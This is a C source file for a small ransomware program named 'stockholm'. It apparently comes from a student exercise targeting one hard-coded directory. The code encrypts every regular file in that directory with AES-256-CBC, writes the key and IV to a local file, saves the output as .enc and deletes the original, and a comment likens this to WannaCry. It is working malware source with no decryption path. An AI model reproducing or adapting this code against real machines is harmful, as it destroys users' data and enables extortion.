#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

int stockholm_encrypt( const char *filepath )
{
	printf( "The file that is going to be encrypted: %s\n", filepath );

	FILE *in = fopen( filepath, "rb" );
	if ( !in )
		return ( 1 );

	char outpath[4096];
	snprintf( outpath, sizeof(outpath), "%s.enc", filepath );
	FILE *out = fopen( outpath, "wb" );
	if (!out) {
		fclose( in );
		return ( 2 );
	}

	unsigned char key[32]; // AES-256
	unsigned char iv[16];  // CBC IV
	RAND_bytes( key, sizeof(key) );
	RAND_bytes( iv, sizeof(iv) );

		FILE *k = fopen("aes_key.bin", "wb");
	fwrite(key, 1, sizeof(key), k);
	fwrite(iv, 1, sizeof(iv), k);
	fclose(k);

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

	unsigned char inbuf[1024], outbuf[1040];
	int inlen, outlen;

	while ((inlen = fread(inbuf, 1, sizeof(inbuf), in)) > 0) {
		EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
		fwrite(outbuf, 1, outlen, out);
	}

	EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
	fwrite(outbuf, 1, outlen, out);

	EVP_CIPHER_CTX_free(ctx);
	fclose(in);
	fclose(out);

	remove(filepath); // Comme WannaCry : supprime le fichier original

	return ( 0 );
}

void stockholm( const char *dirname )
{
	DIR *dir = opendir( dirname ); // We only infect this directory
	if ( dir == NULL ) {
		return ;
	}

	struct dirent *entity;
	entity = readdir( dir );
	while ( entity ) {
		printf( "%hhd %s\n", entity->d_type, entity->d_name );
		// if ( entity->d_type == DT_DIR && strcmp( entity->d_name, "." ) != 0 &&strcmp( entity->d_name, ".." ) != 0 ) {
		// 	char path[4096] = { 0 }; // Max path name
		// 	strcat( path, dirname );
		// 	strcat( path, "/" );
		// 	strcat( path, entity->d_name );
		// 	stockholm( path );
		// }
		if ( entity->d_type == DT_REG ) {
			char filepath[4096] = { 0 }; // Max path name
			strcat( filepath, dirname );
			strcat( filepath, "/" );
			strcat( filepath, entity->d_name );
			stockholm_encrypt( filepath );
		}
		entity = readdir( dir );
	}

	closedir( dir );
}

int main( void )
{
	stockholm( "/home/ebonutto/infection" );
	return ( 0 );
}
